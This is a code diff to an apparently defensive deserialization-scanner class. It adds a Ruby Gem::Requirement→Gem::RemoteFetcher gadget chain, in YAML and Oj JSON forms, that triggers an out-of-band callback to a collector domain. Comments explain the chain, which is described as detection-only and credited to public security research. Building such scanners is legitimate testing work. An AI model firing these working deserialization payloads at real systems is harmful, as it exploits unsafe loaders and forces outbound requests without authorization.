@@ -1036,10 +1036,89 @@ class PayloadMutation:
             payload["payload_raw"] = raw
             payload["note"] = (
                 "Requires YAML.unsafe_load()/Psych object mode; rebuilds an OpenStruct — "
-                "replace with a version-specific Ruby/Gem gadget for RCE"
+                "in-band object-injection marker (dynamic-weak at best, no OOB)."
             )
             results.append(payload)
+
+        oob_payload = self._ruby_detection_chain("yaml")
+        if oob_payload:
+            results.append(oob_payload)
         return results
+
+    # --- Ruby detection (callback) gadget chain -------------------------------
+    # Re-implemented from GitHub Security Lab's ruby-unsafe-deserialization
+    # (MIT, (c) 2024 GitHub Security Lab; original technique by vakzz). DETECTION
+    # variant only: the chain fires on Oj.load / YAML.unsafe_load by inserting a
+    # Gem::Requirement into a Hash key -> Array#hash -> Gem::Requirement#hash (the
+    # "~>" entry calls .to_s) -> Gem::RequestSet::Lockfile#to_s -> ...IndexSpecification
+    # #spec -> Gem::Source#fetch_spec -> Gem::RemoteFetcher (s3 scheme) -> ONE outbound
+    # HTTPS GET to the callback host. It STOPS at the fetch, so the only observable
+    # effect is a single OOB callback (no command execution) — exactly the detect-only
+    # primitive this tool wants, and the first path that lets Ruby reach oob_confirmed.
+    # Version-pinned to Ruby <= 3.3.3 (before 3.3 'sorted_requests' was 'sorted'); needs
+    # URI loaded (true under Rails) and only fires via UNSAFE load. Works best with a
+    # DNS-capable collector (Interactsh/Collaborator): the host label carries the token
+    # and a DNS lookup alone confirms, even if the HTTPS handshake to it then fails.
+    def _ruby_detection_chain(self, fmt: str):
+        oob = get_oob_domain()
+        if not oob:
+            return None
+        host = f"{oob}?"   # trailing '?' required; everything after it becomes the query
+
+        if fmt == "json":
+            import json as _json
+            chain = {"^#1": [[
+                {"^c": "Gem::SpecFetcher"},
+                {"^o": "Gem::Requirement", "requirements": [["~>", {
+                    "^o": "Gem::RequestSet::Lockfile", "set": {
+                        "^o": "Gem::RequestSet", "sorted_requests": [{
+                            "^o": "Gem::Resolver::IndexSpecification", "source": {
+                                "^o": "Gem::Source", "uri": {
+                                    "^o": "URI::HTTP", "host": host, "port": "any",
+                                    "scheme": "s3", "path": "/", "user": "any",
+                                    "password": "any"}}}]},
+                    "dependencies": []}]]}
+            ], "any"]}
+            raw = _json.dumps(chain)
+            tag, desc = "oj_detection_oob", "Oj Gem::Requirement->RemoteFetcher (s3) OOB"
+        else:  # yaml
+            raw = (
+                "---\n"
+                "- !ruby/class 'Gem::SpecFetcher'\n"
+                "- ? !ruby/object:Gem::Requirement\n"
+                "    requirements:\n"
+                "    - - \"~>\"\n"
+                "      - !ruby/object:Gem::RequestSet::Lockfile\n"
+                "        set: !ruby/object:Gem::RequestSet\n"
+                "          sorted_requests:\n"
+                "          - !ruby/object:Gem::Resolver::IndexSpecification\n"
+                "            name: name\n"
+                "            source: !ruby/object:Gem::Source\n"
+                "              uri: !ruby/object:URI::HTTP\n"
+                "                path: \"/\"\n"
+                "                scheme: s3\n"
+                f"                host: \"{host}\"\n"
+                "                port: \"any\"\n"
+                "                user: any\n"
+                "                password: any\n"
+                "              update_cache: true\n"
+                "        dependencies: []\n"
+                "  : any\n"
+            )
+            tag, desc = "yaml_detection_oob", "YAML Gem::Requirement->RemoteFetcher (s3) OOB"
+
+        b64 = base64.b64encode(raw.encode()).decode()
+        payload = self._make_payload(tag, desc, f"http://{oob}/", b64)
+        payload["payload_raw"] = raw
+        payload["note"] = (
+            f"Blind OOB canary (Ruby <=3.3.3 Gem gadget, detection-only — no RCE): unsafe "
+            f"deserialization triggers one outbound fetch to {oob}. Check the collector for a "
+            f"callback on this vector's token. NOTE: the chain does HTTPS via Gem::RemoteFetcher, "
+            f"so it confirms reliably only with a DNS-capable collector (Interactsh/Collaborator); "
+            f"the internal HTTP-only collector may not register it. Re-implemented from GitHub "
+            f"Security Lab ruby-unsafe-deserialization (MIT), technique by vakzz."
+        )
+        return payload
 
 
     NODEJS_TEST_COMMANDS = TEST_COMMANDS
@@ -1155,9 +1234,13 @@ class PayloadMutation:
             payload["payload_raw"] = raw
             payload["note"] = (
                 "Oj.load(mode: :object) rebuilds {^o:Object,@cmd}; valid Oj object-mode JSON "
-                "(not Marshal) — replace with a version-specific Oj/Gem gadget for RCE"
+                "(not Marshal) — in-band object-injection marker (dynamic-weak at best, no OOB)."
             )
             results.append(payload)
+
+        oob_payload = self._ruby_detection_chain("json")
+        if oob_payload:
+            results.append(oob_payload)
         return results
 
 
